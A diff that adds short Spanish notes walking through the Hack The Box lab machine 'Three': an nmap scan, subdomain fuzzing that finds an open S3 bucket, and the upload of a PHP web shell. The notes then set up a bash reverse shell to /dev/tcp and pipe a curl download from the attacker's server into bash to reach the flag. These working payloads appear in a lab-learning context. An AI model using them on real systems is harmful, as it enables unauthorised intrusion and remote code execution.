@@ -1,0 +1,57 @@
+Three very easy
+
+Un poco lo mismo de antes máquina de inicio
+
+hago nmap 2 puertos 22 y 80
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
+|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
+|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: The Toppers
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+wfuzz -c -z file,/usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hw=1036 -t 200 -H "HOST: FUZZ.thetoppers.htb" http://thetoppers.htb
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://thetoppers.htb/
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                              
+=====================================================================
+
+000000247:   404        0 L      2 W        21 Ch       "s3 - s3"                                                                                            
+000000689:   400        10 L     35 W       306 Ch      "gc._msdcs - gc._msdcs"        
+
+hay un s3
+añadimos s3 al hosts
+
+aws configure
+
+aws --endpoint=http://s3.thetoppers.htb s3 ls
+
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+upload: ./shell.php to s3://thetoppers.htb/shell.php  
+
+añadimos lo siguiente a bash.sh
+bash -i >& /dev/tcp/IP/PORT 0>&1
+
+abrimos servidor en python
+
+python3 -m http.server -d . 4433
+
+http://thetoppers.htb/shell.php?cmd=curl%20%3C10.10.x.x%3E:4433/bash.sh|bash
+
+abrimos nc en el puerto detallado en el archivo bash.sh
+
+y ya tenemos acceso a la flag
